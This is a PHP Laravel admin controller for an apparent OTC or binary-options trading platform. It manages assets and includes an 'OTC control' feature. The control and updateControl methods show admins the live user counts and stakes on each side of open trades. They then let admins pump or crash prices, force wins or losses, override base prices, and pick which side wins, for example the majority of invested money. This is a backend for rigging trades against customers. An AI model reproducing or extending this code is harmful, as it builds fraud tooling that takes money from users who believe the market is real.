<?php

namespace App\Http\Controllers\Admin;

use App\Http\Controllers\Controller;
use App\Models\AdminLog;
use App\Models\Asset;
use App\Services\OtcPriceEngine;
use Illuminate\Http\Request;
use Illuminate\Support\Facades\DB;

class AdminAssetController extends Controller
{
    public function index(Request $request)
    {
        $query = Asset::query();

        if ($request->filled('type')) {
            $query->where('type', $request->type);
        }
        if ($request->filled('search')) {
            $query->where('symbol', 'like', '%'.$request->search.'%')
                  ->orWhere('name', 'like', '%'.$request->search.'%');
        }
        if ($request->filled('otc')) {
            $query->where('is_otc', $request->otc === '1');
        }

        $assets = $query->withCount('trades')->latest()->paginate(30)->withQueryString();

        return view('admin.assets.index', compact('assets'));
    }

    public function create()
    {
        return view('admin.assets.create', ['asset' => null]);
    }

    public function store(Request $request)
    {
        $data = $this->validateAsset($request);
        $asset = Asset::create($data);

        AdminLog::record('asset_create', "Created asset: {$asset->symbol}", 'asset', $asset->id);

        return redirect()->route('admin.assets.index')->with('success', "Asset {$asset->symbol} created.");
    }

    public function edit(Asset $asset)
    {
        return view('admin.assets.create', compact('asset'));
    }

    public function update(Request $request, Asset $asset)
    {
        $data = $this->validateAsset($request, $asset->id);
        $asset->update($data);

        AdminLog::record('asset_update', "Updated asset: {$asset->symbol}", 'asset', $asset->id);

        return back()->with('success', 'Asset updated.');
    }

    public function destroy(Asset $asset)
    {
        $symbol = $asset->symbol;
        $asset->delete();
        AdminLog::record('asset_delete', "Deleted asset: {$symbol}", 'asset', $asset->id);
        return redirect()->route('admin.assets.index')->with('success', "Asset {$symbol} deleted.");
    }

    public function toggle(Asset $asset)
    {
        $asset->update(['is_active' => !$asset->is_active]);
        $status = $asset->is_active ? 'activated' : 'deactivated';
        AdminLog::record('asset_toggle', "Asset {$asset->symbol} {$status}", 'asset', $asset->id);
        return response()->json(['success' => true, 'is_active' => $asset->is_active]);
    }

    public function control(Asset $asset)
    {
        // Get current live trade stats for this asset
        $activeTrades = \App\Models\Trade::where('asset_id', $asset->id)
            ->where('result', 'pending')
            ->selectRaw('
                direction,
                COUNT(*) as user_count,
                SUM(investment) as total_investment
            ')
            ->groupBy('direction')
            ->get()
            ->keyBy('direction');

        $upStats   = $activeTrades->get('up',   (object)['user_count' => 0, 'total_investment' => 0]);
        $downStats = $activeTrades->get('down', (object)['user_count' => 0, 'total_investment' => 0]);

        return view('admin.assets.control', compact('asset', 'upStats', 'downStats'));
    }

    public function updateControl(Request $request, Asset $asset)
    {
        $request->validate([
            'control_mode'         => 'required|in:auto,pump,crash,force_win,force_loss',
            'max_pump_percent'     => 'required|numeric|min:0|max:100',
            'max_crash_percent'    => 'required|numeric|min:0|max:100',
            'pump_duration_minutes'=> 'required|integer|min:1|max:1440',
            'win_side'             => 'required|in:none,majority_investment,minority_investment,majority_users,minority_users',
            'market_volume'        => 'nullable|numeric|min:0',
            'trading_capital'      => 'nullable|numeric|min:0',
            'base_price_override'  => 'nullable|numeric|min:0',
        ]);

        $expiresAt = null;
        if (!in_array($request->control_mode, ['auto', 'force_win', 'force_loss'])) {
            $expiresAt = now()->addMinutes((int)$request->pump_duration_minutes);
        }

        DB::transaction(function () use ($request, $asset, $expiresAt) {
            $lockedAsset = Asset::whereKey($asset->id)->lockForUpdate()->firstOrFail();
            $updates = OtcPriceEngine::prepareControlTransition($lockedAsset, $request->control_mode, $expiresAt);
            $explicitBasePrice = $request->filled('base_price_override') && (float) $request->base_price_override > 0;

            $lockedAsset->update(array_merge($updates, [
                'control_mode'          => $request->control_mode,
                'max_pump_percent'      => $request->max_pump_percent,
                'max_crash_percent'     => $request->max_crash_percent,
                'pump_duration_minutes' => $request->pump_duration_minutes,
                'control_expires_at'    => $expiresAt,
                'win_side'              => $request->win_side,
                'market_volume'         => $request->market_volume ?? $lockedAsset->market_volume,
                'trading_capital'       => $request->trading_capital ?? $lockedAsset->trading_capital,
                'base_price_override'   => $explicitBasePrice
                    ? (float) $request->base_price_override
                    : ($updates['base_price_override'] ?? null),
            ]));

            AdminLog::record(
                'asset_control',
                "Updated OTC control for {$lockedAsset->symbol}: mode={$request->control_mode}, pump={$request->max_pump_percent}%, crash={$request->max_crash_percent}%, win_side={$request->win_side}",
                'asset',
                $lockedAsset->id
            );
        });

        return back()->with('success', 'OTC Engine control updated.');
    }

    private function validateAsset(Request $request, int $assetId = null): array
    {
        return $request->validate([
            'symbol'              => 'required|string|max:20|unique:assets,symbol'.($assetId ? ','.$assetId : ''),
            'name'                => 'required|string|max:100',
            'type'                => 'required|in:forex,crypto,commodity,index,otc,signal',
            'category'            => 'nullable|string|max:50',
            'payout_percent'      => 'required|integer|min:1|max:99',
            'base_price_override' => 'nullable|numeric|min:0.000001',
            'control_mode'        => 'nullable|in:auto,pump,crash,force_win,force_loss',
            'is_otc'              => 'boolean',
            'is_active'           => 'boolean',
            'flag'                => 'nullable|string|max:20',
        ]);
    }
}
